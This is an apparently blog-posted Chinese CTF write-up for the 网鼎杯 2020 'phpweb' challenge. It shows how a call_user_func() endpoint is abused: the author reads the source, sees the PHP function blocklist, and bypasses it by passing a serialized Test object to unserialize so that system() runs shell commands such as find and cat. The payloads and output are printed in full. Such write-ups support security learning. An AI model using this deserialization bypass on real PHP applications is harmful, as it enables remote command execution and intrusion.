# [网鼎杯 2020 朱雀组]phpweb call_user_func()

<img src="https://i-blog.csdnimg.cn/blog_migrate/ebcd1d5cb5f77abd8da7e21eedbb82ec.png" alt="" style="max-height:258px; box-sizing:content-box;" />


时间一跳一跳的 抓个包



<img src="https://i-blog.csdnimg.cn/blog_migrate/426fdf1ef2685fce123e0346f2959721.png" alt="" style="max-height:250px; box-sizing:content-box;" />


很奇怪 结合上面的 date() 认为第一个是函数我们随便输一个看看



<img src="https://i-blog.csdnimg.cn/blog_migrate/51b8460394e286e52b016cb3de13d664.png" alt="" style="max-height:295px; box-sizing:content-box;" />


发现过滤了

随便输一个linux指令



<img src="https://i-blog.csdnimg.cn/blog_migrate/63a50f6b7267839f7a45e27928c02f63.png" alt="" style="max-height:348px; box-sizing:content-box;" />


发现报错了 call_user_func()

看看是啥



<img src="https://i-blog.csdnimg.cn/blog_migrate/98f6427ece41715ff3b409d9d67171b0.png" alt="" style="max-height:266px; box-sizing:content-box;" />


很容易理解 第一个参数是函数名 后面是 参数

那么这里就是

func 函数  p 数值

所以我们看看有什么办法可以

我们尝试读取源代码看看吧

最简单的 伪协议函数

```cobol
func=file_get_contents&p=index.php
```

成功读取了

```php
<?php
    $disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");
    function gettime($func, $p) {
        $result = call_user_func($func, $p);
        $a= gettype($result);
        if ($a == "string") {
            return $result;
        } else {return "";}
    }
    class Test {
        var $p = "Y-m-d h:i:s a";
        var $func = "date";
        function __destruct() {
            if ($this->func != "") {
                echo gettime($this->func, $this->p);
            }
        }
    }
    $func = $_REQUEST["func"];
    $p = $_REQUEST["p"];
 
    if ($func != null) {
        $func = strtolower($func);
        if (!in_array($func,$disable_fun)) {
            echo gettime($func, $p);
        }else {
            die("Hacker...");
        }
    }
    ?>
```

过滤了许多函数 system在里面

这里我们发现了 __destruct()

```php
    class Test {
        var $p = "Y-m-d h:i:s a";
        var $func = "date";
        function __destruct() {
            if ($this->func != "") {
                echo gettime($this->func, $this->p);
            }
        }
    }
```

这里很显然魔术方法就是让我们反序列了

既然 $p为参数   $func为函数名

我们直接构造序列化就可以了

```php
<?php
    class Test {
        var $p = "ls";
        var $func = "system";
        function __destruct() {
            if ($this->func != "") {
                echo gettime($this->func, $this->p);
            }
        }
    }
$a=new Test();
echo urlencode(serialize($a));
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/cb369fd2b3991cd9bf95f7d5c6e69a59.png" alt="" style="max-height:254px; box-sizing:content-box;" />




```cobol
O:4:"Test":2:{s:1:"p";s:17:"find /-name flag*";s:4:"func";s:6:"system";}
```

查找flag文件

```cobol
</script>
<p>
    /proc/sys/kernel/sched_domain/cpu0/domain0/flags
/proc/sys/kernel/sched_domain/cpu1/domain0/flags
/proc/sys/kernel/sched_domain/cpu10/domain0/flags
/proc/sys/kernel/sched_domain/cpu11/domain0/flags
/proc/sys/kernel/sched_domain/cpu12/domain0/flags
/proc/sys/kernel/sched_domain/cpu13/domain0/flags
/proc/sys/kernel/sched_domain/cpu14/domain0/flags
/proc/sys/kernel/sched_domain/cpu15/domain0/flags
/proc/sys/kernel/sched_domain/cpu16/domain0/flags
/proc/sys/kernel/sched_domain/cpu17/domain0/flags
/proc/sys/kernel/sched_domain/cpu18/domain0/flags
/proc/sys/kernel/sched_domain/cpu19/domain0/flags
/proc/sys/kernel/sched_domain/cpu2/domain0/flags
/proc/sys/kernel/sched_domain/cpu20/domain0/flags
/proc/sys/kernel/sched_domain/cpu21/domain0/flags
/proc/sys/kernel/sched_domain/cpu22/domain0/flags
/proc/sys/kernel/sched_domain/cpu23/domain0/flags
/proc/sys/kernel/sched_domain/cpu24/domain0/flags
/proc/sys/kernel/sched_domain/cpu25/domain0/flags
/proc/sys/kernel/sched_domain/cpu26/domain0/flags
/proc/sys/kernel/sched_domain/cpu27/domain0/flags
/proc/sys/kernel/sched_domain/cpu28/domain0/flags
/proc/sys/kernel/sched_domain/cpu29/domain0/flags
/proc/sys/kernel/sched_domain/cpu3/domain0/flags
/proc/sys/kernel/sched_domain/cpu30/domain0/flags
/proc/sys/kernel/sched_domain/cpu31/domain0/flags
/proc/sys/kernel/sched_domain/cpu4/domain0/flags
/proc/sys/kernel/sched_domain/cpu5/domain0/flags
/proc/sys/kernel/sched_domain/cpu6/domain0/flags
/proc/sys/kernel/sched_domain/cpu7/domain0/flags
/proc/sys/kernel/sched_domain/cpu8/domain0/flags
/proc/sys/kernel/sched_domain/cpu9/domain0/flags
/sys/devices/pnp0/00:00/tty/ttyS0/flags
/sys/devices/platform/serial8250/tty/ttyS15/flags
/sys/devices/platform/serial8250/tty/ttyS6/flags
/sys/devices/platform/serial8250/tty/ttyS23/flags
/sys/devices/platform/serial8250/tty/ttyS13/flags
/sys/devices/platform/serial8250/tty/ttyS31/flags
/sys/devices/platform/serial8250/tty/ttyS4/flags
/sys/devices/platform/serial8250/tty/ttyS21/flags
/sys/devices/platform/serial8250/tty/ttyS11/flags
/sys/devices/platform/serial8250/tty/ttyS2/flags
/sys/devices/platform/serial8250/tty/ttyS28/flags
/sys/devices/platform/serial8250/tty/ttyS18/flags
/sys/devices/platform/serial8250/tty/ttyS9/flags
/sys/devices/platform/serial8250/tty/ttyS26/flags
/sys/devices/platform/serial8250/tty/ttyS16/flags
/sys/devices/platform/serial8250/tty/ttyS7/flags
/sys/devices/platform/serial8250/tty/ttyS24/flags
/sys/devices/platform/serial8250/tty/ttyS14/flags
/sys/devices/platform/serial8250/tty/ttyS5/flags
/sys/devices/platform/serial8250/tty/ttyS22/flags
/sys/devices/platform/serial8250/tty/ttyS12/flags
/sys/devices/platform/serial8250/tty/ttyS30/flags
/sys/devices/platform/serial8250/tty/ttyS3/flags
/sys/devices/platform/serial8250/tty/ttyS20/flags
/sys/devices/platform/serial8250/tty/ttyS10/flags
/sys/devices/platform/serial8250/tty/ttyS29/flags
/sys/devices/platform/serial8250/tty/ttyS1/flags
/sys/devices/platform/serial8250/tty/ttyS19/flags
/sys/devices/platform/serial8250/tty/ttyS27/flags
/sys/devices/platform/serial8250/tty/ttyS17/flags
/sys/devices/platform/serial8250/tty/ttyS8/flags
/sys/devices/platform/serial8250/tty/ttyS25/flags
/sys/devices/virtual/net/lo/flags
/sys/devices/virtual/net/eth0/flags
/sys/devices/virtual/net/tunl0/flags
/tmp/flagoefiu4r93
/tmp/flagoefiu4r93</p>
```

很显然 最后两个很奇怪 我们直接读取

```cobol
 
func=unserialize&p=O:4:"Test":2:{s:1:"p";s:22:"cat /tmp/flagoefiu4r93";s:4:"func";s:6:"system";}
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/ce17a74e847ac6ffdff8c7dd374474ad.png" alt="" style="max-height:344px; box-sizing:content-box;" />


得到了 flag

这里主要考点是 call_user_func()

然后通过反序列化传递参数 很简单的一道题了

水一下吧^^